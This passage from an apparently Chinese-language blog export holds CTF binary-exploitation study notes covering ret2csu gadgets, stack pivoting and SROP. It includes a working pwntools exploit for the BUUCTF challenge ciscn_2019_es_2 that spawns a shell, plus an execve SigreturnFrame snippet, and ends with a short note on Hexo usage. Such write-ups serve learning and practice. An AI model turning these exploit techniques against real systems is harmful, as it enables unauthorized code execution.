class="hljs-number">0000000000400624</span> __libc_csu_init endp<br></code></pre></td></tr></table></figure><ul><li>从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 <strong>rbx,rbp,r12,r13,r14,r15</strong> 寄存器的数据。</li><li>从 0x0000000000400600 到 0x0000000000400609，我们可以将<strong>r13 赋给 rdx, 将 r14 赋给 rsi，将 r15d 赋给 edi</strong>（需要注意的是，虽然这里赋给的是 edi，<strong>但其实此时 rdi 的高 32 位寄存器值为 0（自行调试）</strong>，所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。</li><li>从 0x000000000040060D 到 0x0000000000400614，我们可以控制 rbx 与 rbp 的之间的关系为 <strong>rbx+1 &#x3D; rbp</strong>，这样我们就<strong>不会执行</strong> loc_400600，进而可以继续执行下面的汇编程序，从而退出这个gadgets。这里我们可以简单的设置 rbx&#x3D;0，rbp&#x3D;1。</li></ul><h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><p> <a href="https://www.cnblogs.com/ZIKH26/articles/15817337.html">栈迁移的原理&amp;&amp;实战运用 - ZikH26 - 博客园</a> </p><ul><li>换个地方getshell</li></ul><h3 id="使用条件："><a href="#使用条件：" class="headerlink" title="使用条件："></a>使用条件：</h3><p>溢出长度不够，<code>payload</code>长度收到限制无法执行getshell</p><ul><li>能够栈溢出，起码也要覆盖ebp</li><li>要有可写的地方<ul><li>bss段</li><li>栈中</li></ul></li></ul><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><ul><li><p>核心</p><p>两次的<code>leave,ret</code><br><code>leave：mov esp,ebp;pop ebp</code></p><p><code>ret：pop eip</code></p></li><li><p>main函数里的栈迁移</p><p>第一次leave ret;将<strong>ebp给放入我们指定的位置</strong>（这个位置的就是迁移后的所在位置）</p><p>第二次将esp也迁移到这个位置，并且pop ebp之后，esp也指向了下一个内存单元（此时这里放的就是<strong>system函数的plt地址</strong>）</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E7%AC%AC%E4%B8%80%E6%AC%A1.png" alt="第一次"></p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E7%AC%AC%E4%BA%8C%E6%AC%A1.png" alt="第二次"></p></li></ul><h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><p>buu的ciscn_2019_es_2</p><p> <a href="https://buuoj.cn/challenges#ciscn_2019_es_2">BUUCTF在线评测</a> </p><ul><li><p>checksec</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/1737718391990.png" alt="1737718391990"></p></li><li><p>IDA</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/1737718423112.png" alt="1737718423112"><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/1737718435019.png" alt="1737718435019"></p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/1737718474976.png" alt="1737718474976"></p></li><li><p>思路</p><p>就是利用栈迁移，将ebp覆盖成s顶部地址，将返回地址覆盖成leave,ret的地址即可</p><p>现在主要是要得到s顶部的地址，ida里可以<strong>利用第一个read将<code>\0</code>覆盖掉</strong>从而泄露ebp上的内容，计算偏移后得到s地址</p></li><li><p>计算偏移</p><p>将断点下载nop处，gdb调试</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/1737719058637.png" alt="1737719058637"></p><p>得到偏移0x38</p></li><li><p>构造栈上数据</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/1737719250596.png" alt="1737719250596"></p></li><li><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># r=remote(&quot;node5.buuoj.cn&quot;,25608)</span><br>r=process(<span class="hljs-string">&#x27;./es2&#x27;</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./es2&#x27;</span>)<br>main_addr=elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>leave_ret_addr=<span class="hljs-number">0x08048562</span><br>system_addr=<span class="hljs-number">0x08048400</span><br><span class="hljs-comment"># gdb.attach(r)</span><br><br>r.recvuntil(<span class="hljs-string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>)<br>payload1=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x25</span>+<span class="hljs-string">b&#x27;ANV&#x27;</span><br>r.send(payload1)  <span class="hljs-comment"># 注意这里要是send而不是sendline，否则在底下接收数据的时候会出错，因为多了一个回车那么就不再是recv到ANV了</span><br>r.recvuntil(<span class="hljs-string">&quot;ANV&quot;</span>)<br>ebp=u32(r.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ebp))<br>s_addr=ebp-<span class="hljs-number">0x38</span><br>binsh_addr=s_addr+<span class="hljs-number">0x10</span> <span class="hljs-comment"># 栈上距离s填充四格，所以要加16，也就是0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(binsh_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(s_addr))<br><br>payload2=<span class="hljs-string">b&#x27;AAAA&#x27;</span>+p32(system_addr)+p32(main_addr)+p32(binsh_addr)+<span class="hljs-string">b&#x27;/bin/sh&#x27;</span><br>payload2=payload2.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload2+=p32(s_addr)+p32(leave_ret_addr)<br>r.send(payload2)<br><span class="hljs-comment"># pause()</span><br>r.interactive()<br></code></pre></td></tr></table></figure></li></ul><h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><ul><li><p>signal机制</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/signal.png" alt="signal"></p><ul><li>内核向进程发送signal机制，进程被挂起，进入内核态</li><li>内核态保存上下文：将所有寄存器压入栈中，压入signal信息。指向sigreturn的系统掉哦那个地址，也就是图中所示的1过程</li><li>在signal handler后执行sigreturn，恢复寄存器，我们所做的就是<strong>构造好栈，然后触发sigreturn，达到控制寄存器的目的，从而getshell</strong></li><li>32位sigreturn调用号为118</li><li>64位sigreturn调用号为15</li></ul></li><li><p>前提条件</p><ul><li>必须存在栈溢出</li><li>必须知道&#x2F;bin&#x2F;sh的地址</li><li>允许溢出的长度必须足够长</li><li>可以去系统调用sigreturn</li><li>知道syscall的地址</li></ul></li><li><p>如何利用</p><ul><li><p>我们通过伪造SignFrame，然后除法Sigreturn，将栈中构造好的数据送入寄存器，通过syscall执行系统调用</p></li><li><p>pwntools集成了SROP的攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 例子</span><br>sigframe = SigreturnFrame()<br>sigframe.rax = constants.SYS_execve<br>sigframe.rdi = stack_addr + <span class="hljs-number">0x120</span>  <span class="hljs-comment"># &quot;/bin/sh&quot; &#x27;s addr</span><br>sigframe.rsi = <span class="hljs-number">0x0</span><br>sigframe.rdx = <span class="hljs-number">0x0</span><br>sigframe.rsp = stack_addr<br>sigframe.rip = syscall_ret<br></code></pre></td></tr></table></figure><p>我们可以直接设置寄存器的值</p></li><li><p>首先设置rax，将返回地址覆盖成syscall，触发sigreturn即可</p></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>2025冬令营</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>备注</title>
    <link href="/2025/01/18/%E5%A4%87%E6%B3%A8/"/>
    <url>/2025/01/18/%E5%A4%87%E6%B3%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h1><h2 id="创建新文章"><a href="#创建新文章" class="headerlink" title="创建新文章"></a>创建新文章</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">hexo <span class="hljs-built_in">new</span> <span class="hljs-built_in">post</span> 文件名<br></code></pre></td></tr></table></figure><h2 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h2><p>步骤</p><ol><li>将图片放入对于文件夹下</li><li>md中输入<code>![图片下的备注](图片名)</code></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
